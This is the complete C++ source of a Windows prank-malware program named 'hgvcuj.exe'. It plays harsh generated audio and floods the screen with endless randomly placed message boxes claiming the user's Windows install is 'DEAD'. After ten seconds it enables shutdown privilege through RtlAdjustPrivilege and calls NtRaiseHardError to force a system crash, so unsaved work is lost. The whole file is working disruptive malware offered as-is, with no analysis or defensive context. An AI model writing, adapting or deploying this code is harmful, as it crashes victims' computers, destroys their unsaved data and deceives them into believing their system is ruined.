#include <windows.h>
#include <mmsystem.h>
#include <winternl.h>
#include <random>
#include <thread>
#include <cstdint>

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

void febypass(){ 
    BOOLEAN bEnabled;
    ULONG uResp;

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);

    NtRaiseHardError(0xc0000022, 0, 0, NULL, 6, &uResp);
}

static uint64_t audioT = 0;

uint8_t bytebeat(uint64_t t) {
    return (uint8_t)(
        (
            (
                t * ((t >> 10 | t >> 12) & 15)
                + ((t >> 5) * (t >> 8))
            )
            ^
            (
                (t * (t >> ((t >> 14 & 7) + 3)))
                | ((t >> 3) * (t >> 13))
            )
            ^
            (
                ((t >> 4) | (t >> 7))
                * (((t >> 11) ^ (t >> 9)) & 63)
            )
            ^
            (t * t >> 6)
        ) & 255
    );
}

void CALLBACK WaveOutProc(HWAVEOUT, UINT uMsg, DWORD_PTR, DWORD_PTR, DWORD_PTR);

struct AudioState {
    HWAVEOUT hWaveOut = nullptr;
    WAVEHDR  headers[2] = {};
    uint8_t  buffers[2][4096] = {};
    int      current = 0;
};

static AudioState gAudio;

void FillBuffer(uint8_t* buf, int size) {
    for (int i = 0; i < size; i++)
        buf[i] = bytebeat(audioT++);
}

void SubmitBuffer(int idx) {
    FillBuffer(gAudio.buffers[idx], 4096);
    gAudio.headers[idx].lpData         = (LPSTR)gAudio.buffers[idx];
    gAudio.headers[idx].dwBufferLength  = 4096;
    gAudio.headers[idx].dwFlags         = 0;
    waveOutPrepareHeader(gAudio.hWaveOut, &gAudio.headers[idx], sizeof(WAVEHDR));
    waveOutWrite(gAudio.hWaveOut, &gAudio.headers[idx], sizeof(WAVEHDR));
}

void CALLBACK WaveOutProc(HWAVEOUT, UINT uMsg, DWORD_PTR, DWORD_PTR dwParam1, DWORD_PTR) {
    if (uMsg == WOM_DONE) {
        WAVEHDR* hdr = (WAVEHDR*)dwParam1;
        waveOutUnprepareHeader(gAudio.hWaveOut, hdr, sizeof(WAVEHDR));
        int idx = (hdr == &gAudio.headers[0]) ? 0 : 1;
        SubmitBuffer(idx);
    }
}

void StartAudio() {
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag      = WAVE_FORMAT_PCM;
    wfx.nChannels       = 1;
    wfx.nSamplesPerSec  = 8000;
    wfx.wBitsPerSample  = 8;
    wfx.nBlockAlign     = 1;
    wfx.nAvgBytesPerSec = 8000;

    waveOutOpen(&gAudio.hWaveOut, WAVE_MAPPER, &wfx,
                (DWORD_PTR)WaveOutProc, 0, CALLBACK_FUNCTION);

    SubmitBuffer(0);
    SubmitBuffer(1);
}

struct BoxParams {
    int x, y;
    const wchar_t* msg;
    const wchar_t* title;
    UINT icon;
};

DWORD WINAPI SpawnBox(LPVOID param) {
    BoxParams* p = (BoxParams*)param;

    struct HookState { int x, y; };
    static thread_local HookState tls;
    tls.x = p->x;
    tls.y = p->y;

    HHOOK hook = SetWindowsHookEx(WH_CBT,
        [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
            if (nCode == HCBT_ACTIVATE) {
                SetWindowPos((HWND)wParam, nullptr, tls.x, tls.y, 0, 0,
                             SWP_NOSIZE | SWP_NOZORDER);
            }
            return CallNextHookEx(nullptr, nCode, wParam, lParam);
        },
        nullptr, GetCurrentThreadId());

    MessageBox(nullptr, p->msg, p->title, MB_OK | p->icon);

    UnhookWindowsHookEx(hook);
    delete p;
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::mt19937 rng(std::random_device{}());

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    const wchar_t* messages[] = {
        L"hgvcuj",
        L"hgvcuj.exe",
        L"Your windows install is DEAD...",
        L"https://github.com/Seal-Softworks/hgvcuj",
        L"Seal Softworks...",
        L"Reinstall windows 🙏",
        L"success",
        L"hgvcuj.exe"
    };

    const wchar_t* titles[] = {
        L"hgvcuj.exe",
        L"success.exe",
        L"Your windows install is DEAD 😭🙏",
        L"hgvcuj",
        L"Seal Softworks"
    };

    UINT icons[] = {
        MB_ICONERROR, MB_ICONWARNING,
        MB_ICONINFORMATION, MB_ICONQUESTION,
    };

    auto pick = [&](auto& arr) -> auto& {
        std::uniform_int_distribution<int> d(0, (int)std::size(arr) - 1);
        return arr[d(rng)];
    };

    std::uniform_int_distribution<int> distW(0, screenW - 1);
    std::uniform_int_distribution<int> distH(0, screenH - 1);

    StartAudio();

    std::thread([]() {
        Sleep(10000);
        febypass();
    }).detach();

    while (true) {
        BoxParams* p = new BoxParams();
        p->x     = distW(rng);
        p->y     = distH(rng);
        p->msg   = pick(messages);
        p->title = pick(titles);
        p->icon  = pick(icons);

        HANDLE hThread = CreateThread(nullptr, 0, SpawnBox, p, 0, nullptr);
        CloseHandle(hThread);

        Sleep(100);
    }
}